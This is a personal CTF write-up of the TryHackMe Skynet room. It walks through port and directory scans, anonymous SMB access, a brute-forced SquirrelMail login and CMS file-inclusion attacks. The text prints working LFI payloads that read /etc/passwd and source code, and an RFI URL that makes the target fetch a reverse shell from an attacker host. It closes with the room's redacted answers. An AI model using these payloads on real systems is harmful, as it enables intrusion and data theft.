# Skynet
*A vulnerable Terminator themed Linux machine.*

>
> Bradley Lubow | rnbochsr June 2022
>

My notes and solutions for the TryHackMe.com Skynet room.

## Task 1 - Deploy and compromise the vulnerable machine!

Hasta la vista, baby.

Are you able to compromise this Terminator themed machine?

You can follow the official walkthrough for this challenge on the [TryHackMe blog.](https://blog.tryhackme.com/skynet-writeup/)

### Recon
Initial recon starts with the following scans:
* `nmap` 
* `dirb` 
* `gobuster`
* `nikto`

#### NMAP Scan
Open ports: 
```bash
# Nmap 7.91 scan initiated Thu Jun 16 21:19:50 2022 as: nmap -p- -T5 -v -Pn -oN nmap-init.scan 10.10.102.21
Nmap scan report for 10.10.102.21
Host is up (0.093s latency).
Not shown: 65529 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Jun 16 21:24:10 2022 -- 1 IP address (1 host up) scanned in 260.38 seconds
```

Running service identification on the discovered ports shows: 
```bash
# Nmap 7.91 scan initiated Thu Jun 16 21:36:22 2022 as: nmap -p22,80,110,139,143,445 -T5 -v -Pn -sC -sV -oN nmap-svcs.scan 10.10.102.21
Nmap scan report for 10.10.102.21
Host is up (0.090s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: UIDL AUTH-RESP-CODE TOP SASL CAPA PIPELINING RESP-CODES
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: IDLE post-login more have LOGIN-REFERRALS listed LITERAL+ ID SASL-IR OK LOGINDISABLEDA0001 IMAP4rev1 Pre-login ENABLE capabilities
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m13s, median: 0s
| nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SKYNET<00>           Flags: <unique><active>
|   SKYNET<03>           Flags: <unique><active>
|   SKYNET<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-06-16T20:36:35-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-06-17T01:36:34
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 16 21:36:38 2022 -- 1 IP address (1 host up) scanned in 16.14 seconds

```

We've got web servers, `ssh`, email servers, and SMB servers. Without any credentials yet, the web server and any directories would be the first step. Then look at the SMB shares as those are often available vectors. Let's see what the directory scans reveal. 

#### Dirb Scan
```bash
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirb.scan
START_TIME: Thu Jun 16 22:22:45 2022
URL_BASE: http://10.10.102.21/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.102.21/ ----
==> DIRECTORY: http://10.10.102.21/admin/
==> DIRECTORY: http://10.10.102.21/config/
==> DIRECTORY: http://10.10.102.21/css/
+ http://10.10.102.21/index.html (CODE:200|SIZE:523)
==> DIRECTORY: http://10.10.102.21/js/
+ http://10.10.102.21/server-status (CODE:403|SIZE:277)
==> DIRECTORY: http://10.10.102.21/squirrelmail/

---- Entering directory: http://10.10.102.21/admin/ ----

---- Entering directory: http://10.10.102.21/config/ ----

---- Entering directory: http://10.10.102.21/css/ ----

---- Entering directory: http://10.10.102.21/js/ ----

---- Entering directory: http://10.10.102.21/squirrelmail/ ----
+ http://10.10.102.21/squirrelmail/class (CODE:403|SIZE:277)
==> DIRECTORY: http://10.10.102.21/squirrelmail/config/
+ http://10.10.102.21/squirrelmail/functions (CODE:403|SIZE:277)
+ http://10.10.102.21/squirrelmail/help (CODE:403|SIZE:277)
==> DIRECTORY: http://10.10.102.21/squirrelmail/images/
+ http://10.10.102.21/squirrelmail/include (CODE:403|SIZE:277)
+ http://10.10.102.21/squirrelmail/index.php (CODE:302|SIZE:0)
+ http://10.10.102.21/squirrelmail/locale (CODE:403|SIZE:277)
==> DIRECTORY: http://10.10.102.21/squirrelmail/plugins/
==> DIRECTORY: http://10.10.102.21/squirrelmail/src/
==> DIRECTORY: http://10.10.102.21/squirrelmail/themes/

---- Entering directory: http://10.10.102.21/squirrelmail/config/ ----
+ http://10.10.102.21/squirrelmail/config/index.php (CODE:302|SIZE:0)

---- Entering directory: http://10.10.102.21/squirrelmail/images/ ----
+ http://10.10.102.21/squirrelmail/images/index.php (CODE:302|SIZE:0)

(!) FATAL: Too many errors connecting to host
    (Possible cause: COULDNT CONNECT)

-----------------
END_TIME: Thu Jun 16 23:20:10 2022
DOWNLOADED: 36738 - FOUND: 10

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirb.scan
START_TIME: Fri Jun 17 09:57:01 2022
URL_BASE: http://10.10.51.24/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.51.24/ ----
==> DIRECTORY: http://10.10.51.24/admin/
==> DIRECTORY: http://10.10.51.24/config/
==> DIRECTORY: http://10.10.51.24/css/
+ http://10.10.51.24/index.html (CODE:200|SIZE:523)
==> DIRECTORY: http://10.10.51.24/js/
+ http://10.10.51.24/server-status (CODE:403|SIZE:276)
==> DIRECTORY: http://10.10.51.24/squirrelmail/

---- Entering directory: http://10.10.51.24/admin/ ----

---- Entering directory: http://10.10.51.24/config/ ----

---- Entering directory: http://10.10.51.24/css/ ----

---- Entering directory: http://10.10.51.24/js/ ----

---- Entering directory: http://10.10.51.24/squirrelmail/ ----
+ http://10.10.51.24/squirrelmail/class (CODE:403|SIZE:276)
==> DIRECTORY: http://10.10.51.24/squirrelmail/config/
+ http://10.10.51.24/squirrelmail/functions (CODE:403|SIZE:276)
+ http://10.10.51.24/squirrelmail/help (CODE:403|SIZE:276)
==> DIRECTORY: http://10.10.51.24/squirrelmail/images/
+ http://10.10.51.24/squirrelmail/include (CODE:403|SIZE:276)
+ http://10.10.51.24/squirrelmail/index.php (CODE:302|SIZE:0)
+ http://10.10.51.24/squirrelmail/locale (CODE:403|SIZE:276)
==> DIRECTORY: http://10.10.51.24/squirrelmail/plugins/
==> DIRECTORY: http://10.10.51.24/squirrelmail/src/
==> DIRECTORY: http://10.10.51.24/squirrelmail/themes/

---- Entering directory: http://10.10.51.24/squirrelmail/config/ ----
+ http://10.10.51.24/squirrelmail/config/index.php (CODE:302|SIZE:0)

---- Entering directory: http://10.10.51.24/squirrelmail/images/ ----
+ http://10.10.51.24/squirrelmail/images/index.php (CODE:302|SIZE:0)

---- Entering directory: http://10.10.51.24/squirrelmail/plugins/ ----
==> DIRECTORY: http://10.10.51.24/squirrelmail/plugins/administrator/
==> DIRECTORY: http://10.10.51.24/squirrelmail/plugins/calendar/
==> DIRECTORY: http://10.10.51.24/squirrelmail/plugins/demo/
==> DIRECTORY: http://10.10.51.24/squirrelmail/plugins/fortune/
+ http://10.10.51.24/squirrelmail/plugins/index.php (CODE:302|SIZE:0)
==> DIRECTORY: http://10.10.51.24/squirrelmail/plugins/info/
==> DIRECTORY: http://10.10.51.24/squirrelmail/plugins/test/
==> DIRECTORY: http://10.10.51.24/squirrelmail/plugins/translate/

---- Entering directory: http://10.10.51.24/squirrelmail/src/ ----
+ http://10.10.51.24/squirrelmail/src/index.php (CODE:302|SIZE:0)

---- Entering directory: http://10.10.51.24/squirrelmail/themes/ ----
==> DIRECTORY: http://10.10.51.24/squirrelmail/themes/css/
+ http://10.10.51.24/squirrelmail/themes/index.php (CODE:302|SIZE:0)

---- Entering directory: http://10.10.51.24/squirrelmail/plugins/administrator/ ----
+ http://10.10.51.24/squirrelmail/plugins/administrator/index.php (CODE:302|SIZE:0)

---- Entering directory: http://10.10.51.24/squirrelmail/plugins/calendar/ ----
+ http://10.10.51.24/squirrelmail/plugins/calendar/index.php (CODE:302|SIZE:0)
+ http://10.10.51.24/squirrelmail/plugins/calendar/README (CODE:200|SIZE:887)

---- Entering directory: http://10.10.51.24/squirrelmail/plugins/demo/ ----
+ http://10.10.51.24/squirrelmail/plugins/demo/index.php (CODE:302|SIZE:0)
+ http://10.10.51.24/squirrelmail/plugins/demo/README (CODE:200|SIZE:837)

---- Entering directory: http://10.10.51.24/squirrelmail/plugins/fortune/ ----
+ http://10.10.51.24/squirrelmail/plugins/fortune/index.php (CODE:302|SIZE:0)
+ http://10.10.51.24/squirrelmail/plugins/fortune/README (CODE:200|SIZE:485)

---- Entering directory: http://10.10.51.24/squirrelmail/plugins/info/ ----
+ http://10.10.51.24/squirrelmail/plugins/info/index.php (CODE:302|SIZE:0)
+ http://10.10.51.24/squirrelmail/plugins/info/README (CODE:200|SIZE:1632)

---- Entering directory: http://10.10.51.24/squirrelmail/plugins/test/ ----
+ http://10.10.51.24/squirrelmail/plugins/test/index.php (CODE:302|SIZE:0)
+ http://10.10.51.24/squirrelmail/plugins/test/README (CODE:200|SIZE:505)

---- Entering directory: http://10.10.51.24/squirrelmail/plugins/translate/ ----
+ http://10.10.51.24/squirrelmail/plugins/translate/index.php (CODE:302|SIZE:0)
+ http://10.10.51.24/squirrelmail/plugins/translate/README (CODE:200|SIZE:1730)

---- Entering directory: http://10.10.51.24/squirrelmail/themes/css/ ----
+ http://10.10.51.24/squirrelmail/themes/css/index.php (CODE:302|SIZE:0)

-----------------
END_TIME: Fri Jun 17 12:05:52 2022
DOWNLOADED: 87628 - FOUND: 27
```

#### Gobuster Scan
```bash
/css                  (Status: 301) [Size: 310] [--> http://10.10.121.76/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.121.76/js/]
/admin                (Status: 301) [Size: 312] [--> http://10.10.121.76/admin/]
/config               (Status: 301) [Size: 313] [--> http://10.10.121.76/config/]
/ai                   (Status: 301) [Size: 309] [--> http://10.10.121.76/ai/]
/squirrelmail         (Status: 301) [Size: 319] [--> http://10.10.121.76/squirrelmail/]
/server-status        (Status: 403) [Size: 277]
```

#### Nikto Scan
```bash
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.100.37
+ Target Port: 80
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ HEAD Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ GET Server may leak inodes via ETags, header found with file /, inode: 20b, size: 592bbec81c0b6, mtime: gzip
+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ GET Cookie SQMSESSID created without the httponly flag
+ OSVDB-3093: GET /squirrelmail/src/read_body.php: SquirrelMail found
+ OSVDB-3233: GET /icons/README: Apache default file found.
```

### Enumeration

#### SMBMAP Scan
```bash
[\] Working on it...
[+] Guest session   	IP: 10.10.121.76:445	Name: 10.10.121.76                                      
[|] Working on it...
[/] Working on it...
[-] Working on it...
                                
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	anonymous                                         	READ ONLY	Skynet Anonymous Share
	milesdyson                                        	NO ACCESS	Miles Dyson Personal Share
	IPC$                                              	NO ACCESS	IPC Service (skynet server (Samba, Ubuntu))
```
There is an anonymous share. Let's have a look at it.
```bash 
root@kali:~# smbclient //<machine IP>/anonymous
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 16:04:00 2020
  ..                                  D        0  Tue Sep 17 07:20:17 2019
  attention.txt                       N      163  Wed Sep 18 03:04:59 2019
  logs                                D        0  Wed Sep 18 04:42:16 2019

                9204224 blocks of size 1024. 5831524 blocks available
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 04:42:16 2019
  ..                                  D        0  Thu Nov 26 16:04:00 2020
  log2.txt                            N        0  Wed Sep 18 04:42:13 2019
  log1.txt                            N      471  Wed Sep 18 04:41:59 2019
  log3.txt                            N        0  Wed Sep 18 04:42:16 2019

                9204224 blocks of size 1024. 5831524 blocks available
smb: \logs\> 
```
Downloading the `attention.txt` and `log1.txt` files. 
```bash
attention.txt
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

The log1.txt files appears to contain a list of what could be passwords. They don't work on the other SMB shares. Since `attention.txt` talks about resettng passwords, maybe we can get into an email account. Miles Dyson's account looks like a good starting point.

### Foothold
Trying to log into Miles Dyson's email using BurpSuite. 
```bash
http://<machine IP>/squirrelmail
```

* This gets us to the login page. 
* Turn on the FoxyProxy BurpSuite setting to capture the login attempt. 
* Use the `milesdyson` user and the password list as the runtime file to use against the login page. 
* All the results are the same status and length accept the correct login password. 
* Using the found credentials we are able to log into Miles' email account and the answer to the first question.

3 emails in the inbox. One has the subject Samba Password Reset. That email contains the system generated password for miles SMB account. Time to look at that. 
```bash
We have changed your smb password after system malfunction.
Password: )s[REDACTED]B`
```

### Pivoting and Additional Enumeration
Loggin into Miles' SMB share you find a number of PDFs and the file: `imoportant.txt`.
```bash
important.txt
1. Add features to beta CMS /45[REDACTED]yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

The beta CMS in the hidden directory is Miles Dyson's personal website. Running a search for possible vulnerabilities shows a vector in the parsing of `php` code. This vulnerability allows for local and remote file inclusion. We can use this to get the user flag as well as obtaining a reverse shell. It can even get us the full php code of the `index.php` file to look for any secrets that might be hidden in the server side code. 
```bash
http://<machine IP>/45[REDACTED]yd/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../index.php
```

That didn't works. We must not have the correct path. Continuing our enumeration.
* Running another Gobuster scan finds an `administrator` directory. 
```bash
/administrator        (Status: 301) [Size: 325] [--> http://<machine IP>/45[REDACTED]yd/administrator/]
```

Let's see what is in this directory before we test again. 
* Running a gobuster scan on the newly found `administrator` directory finds: 
```bash
/alerts               (Status: 301) [Size: 332] [--> http://<machine IP>/45[REDACTED]yd/administrator/alerts/]
/js                   (Status: 301) [Size: 328] [--> http://<machine IP>/45[REDACTED]yd/administrator/js/]
/components           (Status: 301) [Size: 336] [--> http://<machine IP>/45[REDACTED]yd/administrator/components/]
/classes              (Status: 301) [Size: 333] [--> http://<machine IP>/45[REDACTED]yd/administrator/classes/]
```
An `alerts` directory like in the exploit. This must be the directory from which we need to run the exoploit. Let's test the local file inclusion from the `administrator` directory.
```bash
http://<machine IP>/45[REDACTED]yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../../../etc/passwd
```

And it works. The contents of the `passwd` file is printed on the web page.
Now let's get the `index.php` page and see if it holds any secrets. 
```bash
http://<machine IP>/45[REDACTED]yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../index.php
```

That gives a long `base64` encoded string `PD[REDACTED]Pg==`.
Run that thru `base64 -d` and the full code of the index page is ours. 
And we can use the same technique to get the user flag, if the file is readable by the www-data user. (We are the www-data user because it is the web server that is running the exploit code.)
```bash
http://<machine IP>/45[REDACTED]yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../../../home/milesdyson/user.txt
```
And the web page displays the user flag: `7c[REDACTED]07`


### Privilege Escalation
Time to get a reverse shell and elevate our privileges. We use the same technique to have the web server download a reverse shell script to connect to our waiting `netcat` listener. 
* We'll use the `php-reverse-shell.php` file for the reverse shell.
* Modify it with our attacking machine IP and port.
* Start a php webserver in a terminal in the same directory we have the reverse shell script.
* Start our netcat listener in another terminal using the same port we set in the reverse shell script. 
* Give the webserver the url of our webserver and the name of our shell script. 
```bash
http://<machine IP>/45[REDACTED]yd/administrator/alerts/alertConfigField.php?urlConfig=http://<attack machine IP>:<port>/shell.php
```

A reverse shell is caught! Running `whoami` confirms we are the www-data user. We'll have to look around for an escalation vector.

Rev shell as www-data
search milesdyson directory
Back-up files in `/var/www/html` based on `cron` job


**Answer the questions below**

*What is Miles password for his emails?* cy[REDACTED]or

*What is the hidden directory?* /45[REDACTED]yd

*What is the vulnerability called when you can include a remote file for malicious purposes?* remote file inclusion

*What is the user flag?* 7c[REDACTED]07

*What is the root flag?* 3f[REDACTED]49

This was a fun room. I got a chance to string some techniques together to get access and escalate my privileges. 

